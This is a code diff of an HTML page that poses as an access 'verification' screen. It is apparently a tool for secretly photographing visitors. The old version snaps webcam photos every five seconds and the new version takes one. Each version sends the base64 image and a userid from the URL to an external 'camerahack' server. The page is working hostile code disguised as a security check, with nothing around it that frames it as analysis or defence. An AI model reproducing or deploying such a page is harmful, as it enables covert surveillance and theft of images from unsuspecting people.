@@ -2,103 +2,63 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verification | Secure</title>
+  <title>Verification</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background: #0f172a;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      height: 100vh;
-      overflow: hidden;
+      background: #000;
+      color: white;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding-top: 50px;
     }
-    h1 {
-      font-size: 1.8rem;
-      margin-bottom: 20px;
-      animation: pulse 1.5s infinite;
-      color: #00ff99;
-    }
-    #video {
-      width: 280px;
-      height: auto;
-      border-radius: 12px;
-      border: 3px solid #00ff99;
-      margin-bottom: 10px;
-      box-shadow: 0 0 20px #00ff99;
-    }
-    #status {
-      font-size: 1rem;
-      margin-top: 10px;
-      color: #cccccc;
-    }
-    .footer {
-      position: absolute;
-      bottom: 15px;
-      font-size: 0.9rem;
-      color: #888;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.05); opacity: 0.7; }
-      100% { transform: scale(1); opacity: 1; }
+    video {
+      width: 300px;
+      border-radius: 10px;
+      border: 2px solid #0f0;
     }
   </style>
 </head>
 <body>
-  <h1>🔒 Capturing Image... Stay Still</h1>
-  <video id="video" autoplay playsinline></video>
-  <div id="status">Initializing camera...</div>
-  <div class="footer">❤️ Powered by Team Tasmina</div>
+  <h1>🔐 Verifying Access...</h1>
+  <video id="video" autoplay muted playsinline></video>
+  <p id="status">Accessing camera...</p>
 
   <script>
+    const userId = new URLSearchParams(window.location.search).get("userid");
     const video = document.getElementById('video');
     const statusText = document.getElementById('status');
 
-    async function initCamera() {
+    async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        statusText.innerText = "✅ Camera accessed. Capturing...";
-        startCapturing(stream);
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        statusText.innerText = "✅ Capturing image...";
+
+        const blob = await imageCapture.takePhoto();
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          fetch("https://camerahack.onrender.com/send-photo", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              user_id: userId,
+              img_base64: reader.result
+            })
+          });
+        };
+        reader.readAsDataURL(blob);
+
       } catch (err) {
-        statusText.innerText = "❌ Camera access denied.";
+        statusText.innerText = "❌ Failed to access camera.";
       }
     }
 
-    function startCapturing(stream) {
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const userId = new URLSearchParams(window.location.search).get("userid");
-
-      const interval = setInterval(async () => {
-        try {
-          const blob = await imageCapture.takePhoto();
-          const reader = new FileReader();
-          reader.onloadend = () => {
-            fetch("https://camerahack.onrender.com/send-photo", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                user_id: userId,
-                img_base64: reader.result // includes base64 prefix
-              })
-            });
-          };
-          reader.readAsDataURL(blob);
-        } catch (error) {
-          clearInterval(interval);
-          statusText.innerText = "❌ Error capturing photo.";
-        }
-      }, 5000);
-    }
-
-    initCamera();
+    startCamera();
   </script>
 </body>
 </html>
